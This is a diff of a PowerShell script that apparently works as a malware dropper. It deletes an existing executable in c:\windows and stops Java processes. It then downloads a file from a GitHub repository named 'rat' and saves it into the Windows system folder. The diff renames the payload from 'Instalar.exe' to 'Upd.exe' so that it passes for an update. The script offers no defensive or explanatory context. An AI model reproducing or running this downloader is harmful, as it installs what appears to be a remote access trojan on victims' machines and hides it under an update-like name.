@@ -1,7 +1,7 @@
 cd\
 cd c:\windows
 
-$f1 = 'c:\windows\Instalar.exe'
+$f1 = 'c:\windows\Upd.exe'
 if (Test-Path $f1) {
    try {	
       Remove-Item $f1 -recurse
@@ -14,8 +14,8 @@ if ($f3) {
    Stop-Process -processname Java
 }
 
-$url = "https://raw.githubusercontent.com/itarare/rat/master/Instalar.txt"
-$output = "c:\windows\Instalar.exe"
+$url = "https://raw.githubusercontent.com/itarare/rat/master/Upd0001.exe"
+$output = "c:\windows\Upd.exe"
 $start_time = Get-Date
 
 Invoke-WebRequest -Uri $url -OutFile $output
